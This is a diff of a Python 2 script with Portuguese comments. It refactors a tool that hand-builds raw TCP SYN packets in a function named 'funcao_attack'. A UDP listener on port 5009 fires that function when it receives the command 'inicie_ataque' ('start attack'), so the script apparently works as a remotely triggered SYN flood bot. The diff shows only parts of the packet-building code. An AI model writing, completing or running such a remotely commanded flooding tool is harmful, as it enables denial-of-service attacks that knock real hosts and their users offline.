@@ -1,10 +1,7 @@
-import sys
 from threading import Thread
-
-
+import sys, random, socket, struct
 
 def funcao_attack():
-
 	# checksum functions needed for calculation checksum
 	def checksum(msg):
 	    s = 0
@@ -59,7 +56,7 @@ def funcao_attack():
 	ihl_version = (version << 4) + ihl
 	 
 	# the ! in the pack format string means network order
-	ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+	ip_header = struct.pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 	 
 	# tcp header fields
 	source = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
@@ -83,7 +80,7 @@ def funcao_attack():
 	tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
 	 
 	# the ! in the pack format string means network order
-	tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
+	tcp_header = struct.pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
 	 
 	# pseudo header fields
 	source_address = socket.inet_aton( source_ip )
@@ -92,13 +89,13 @@ def funcao_attack():
 	protocol = socket.IPPROTO_TCP
 	tcp_length = len(tcp_header)
 	 
-	psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
+	psh = struct.pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
 	psh = psh + tcp_header;
 	 
 	tcp_checksum = checksum(psh)
 	 
 	# make the tcp header again and fill the correct checksum
-	tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
+	tcp_header = struct.pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
 	 
 	# final full packet - syn packets dont have any data
 	packet = ip_header + tcp_header
@@ -112,11 +109,10 @@ def funcao_attack():
 
 
 def escutando():
-	from socket import socket, gethostbyname, AF_INET, SOCK_DGRAM
 	PORT_NUMBER = 5009
 	SIZE = 1024
-	hostName = gethostbyname( '0.0.0.0' )
-	mySocket = socket( AF_INET, SOCK_DGRAM )
+	hostName = socket.gethostbyname( '0.0.0.0' )
+	mySocket = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
 	mySocket.bind( (hostName, PORT_NUMBER) )
 
 	print 'Escutando',PORT_NUMBER
@@ -124,10 +120,16 @@ def escutando():
 	while True:
 	    (data,addr) = mySocket.recvfrom(SIZE)
             if data == 'inicie_ataque':
+            	print 'entrou'
             	funcao_attack()
 
 
-escutando1 = Thread(target=escutando)
 
-escutando1.start()
+def main():
+	escutando1 = Thread(target=escutando)
+	escutando1.start()
 
+
+
+
+main()
